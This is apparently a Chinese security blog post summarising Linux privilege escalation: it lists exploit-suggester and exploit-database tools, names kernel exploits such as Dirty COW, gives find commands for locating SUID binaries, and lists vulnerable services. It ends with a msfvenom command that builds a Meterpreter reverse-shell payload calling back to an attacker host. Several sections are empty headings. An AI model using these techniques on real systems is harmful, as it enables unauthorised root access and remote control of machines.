Title: Linux环境的下提权方式总结
Date: 2018-06-15 03:20
Modified: 2018-06-15 03:20
Category: 安全
Tags: Linux
Slug: O6
Authors: nJcx
Summary: Linux环境的下提权方式总结~

#### 工具


工具镇楼：

```bash
https://github.com/SecWiki/linux-kernel-exploits.git
https://github.com/offensive-security/exploitdb.git
https://github.com/mzet-/linux-exploit-suggester.git
https://github.com/InteliSecureLabs/Linux_Exploit_Suggester.git
https://github.com/jondonas/linux-exploit-suggester-2.git
https://github.com/belane/linux-soft-exploit-suggester.git
linuxprivchecker： https://www.securitysift.com/download/linuxprivchecker.py
http://pentestmonkey.net/tools/unix-privesc-check/unix-privesc-check-1.4.tar.gz
https://github.com/rebootuser/LinEnum
https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS
```

![linux提权](../images/WechatIMG169.png)


#### 内核漏洞提权

 利用比如脏牛漏洞提权(CVE-2016-5195) overlayfs （CVE-2015-1328）
，等等

上工具linux-exploit-suggester

![linux提权](../images/WechatIMG180.jpeg)


用 脏牛漏洞提权(CVE-2016-5195) 测试一下 

![linux提权](../images/cow1.png)


用 overlayfs（CVE-2015-1328） 测试一下 

![linux提权](../images/WechatIMG182.jpeg)
 


#### SUID 提权


SUID是赋予文件的一种权限，它会出现在文件拥有者权限的执行位上，具有这种权限的文件会在其执行时，使调用者暂时获得该文件拥有者的权限。也就是如果ROOT用户给某个可执行文件加了S权限，那么该执行程序运行的时候将拥有ROOT权限。

以下命令可以发现系统上运行的所有SUID可执行文件

```bash
find / -perm -u=s -type f 2>/dev/null
find / -user root -perm -4000-print2>/dev/null
find / -user root -perm -4000-exec ls -ldb {} \;

```
配合进行提权

```bash
https://gtfobins.github.io/
```

下面做个演示




#### 环境变量劫持提权

如果有一个程序具有ROOT权限，它运行的时候需要调用其他程序，那么我们通过环境变量来挟持它运行我们的payload。我们的payload将拥有ROOT权限。



#### 配置错误提权


####  其他工具提权



OpenSMTPD 提权

Exim 4.87 / 4.91 提权

Ubuntu 18.04 - 'lxd'  提权

Serv-U FTP Server  提权

systemtap 1.1-3.el5  提权

Chkrootkit 0.49  提权

OSSEC 2.8 - 'hosts.deny'  提权

Docker Daemon 	提权


MSF 使用Chkrootkit 0.49  提权

```bash

msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=172.16.251.133 LPORT=443 -a x64 --platform linux -f elf > payload.elf 

```

![linux提权](../images/msfchk.png)

![linux提权](../images/msfchk1.png)
 



 
